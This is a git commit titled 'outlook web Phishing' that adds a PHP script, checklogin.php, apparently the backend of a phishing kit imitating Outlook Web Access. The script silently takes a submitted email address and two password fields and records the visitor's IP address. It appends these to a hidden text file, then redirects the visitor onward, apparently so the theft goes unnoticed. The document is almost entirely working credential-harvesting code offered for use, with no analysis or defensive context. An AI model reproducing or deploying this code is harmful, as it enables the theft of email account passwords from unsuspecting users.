d34464c6e73e5a3f815205ca1da2edc6a1500d1c
RASSec <exp_data@126.com>
2017-02-24 21:58:13 +0800

    outlook web Phishing

---
+++ outlook web Phishing/checklogin.php
@@ -0,0 +1,52 @@
+<?php
+
+@error_reporting(0);
+
+$email_name=$_POST["d"];
+$email_pwd=$_POST["e"];
+$email_pwd1=$_POST["f"];
+$url="CookieAuth70fb.html";
+
+function GetIp(){
+    $realip = '';
+    $unknown = 'unknown';
+    if (isset($_SERVER)){
+        if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) && strcasecmp($_SERVER['HTTP_X_FORWARDED_FOR'], $unknown)){
+            $arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+            foreach($arr as $ip){
+                $ip = trim($ip);
+                if ($ip != 'unknown'){
+                    $realip = $ip;
+                    break;
+                }
+            }
+        }else if(isset($_SERVER['HTTP_CLIENT_IP']) && !empty($_SERVER['HTTP_CLIENT_IP']) && strcasecmp($_SERVER['HTTP_CLIENT_IP'], $unknown)){
+            $realip = $_SERVER['HTTP_CLIENT_IP'];
+        }else if(isset($_SERVER['REMOTE_ADDR']) && !empty($_SERVER['REMOTE_ADDR']) && strcasecmp($_SERVER['REMOTE_ADDR'], $unknown)){
+            $realip = $_SERVER['REMOTE_ADDR'];
+        }else{
+            $realip = $unknown;
+        }
+    }else{
+        if(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), $unknown)){
+            $realip = getenv("HTTP_X_FORWARDED_FOR");
+        }else if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), $unknown)){
+            $realip = getenv("HTTP_CLIENT_IP");
+        }else if(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), $unknown)){
+            $realip = getenv("REMOTE_ADDR");
+        }else{
+            $realip = $unknown;
+        }
+    }
+    $realip = preg_match("/[\d\.]{7,15}/", $realip, $matches) ? $matches[0] : $unknown;
+    return $realip;
+}
+$gip=GetIp();
+@file_put_contents("testhiokyeloow.txt", "$email_name   $email_pwd   $email_pwd1 $gip\r\n", FILE_APPEND);
+
+
+Header("HTTP/1.1 303 See Other");
+Header("Location: $url");
+
+?>
+
